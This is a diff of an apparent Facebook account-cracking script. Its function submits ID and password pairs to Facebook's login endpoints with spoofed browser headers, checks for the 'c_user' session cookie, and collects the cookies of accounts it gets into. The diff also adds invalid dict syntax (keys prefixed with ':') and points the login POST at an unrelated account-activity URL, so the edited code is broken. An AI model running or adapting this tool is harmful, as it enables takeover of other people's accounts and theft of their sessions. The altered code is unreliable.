@@ -1221,23 +1221,23 @@ def m6(idf,pwv):
             "pass":ps,
             "login":"Log In"}
    header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
+            :'authority': 'm.facebook.com',
+            :'method': 'GET',
+            :'path': '/login/device-based/login/async/',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
             'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'sec-ch-ua': '"Google Chrome";v="123", "Not)A;Brand";v="6", "Chromium";v="123"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36'}
-   lo = session.post('https://lite.facebook.com/login/',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+   lo = session.post('https://accountscenter.facebook.com/password_and_security/login_activity/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
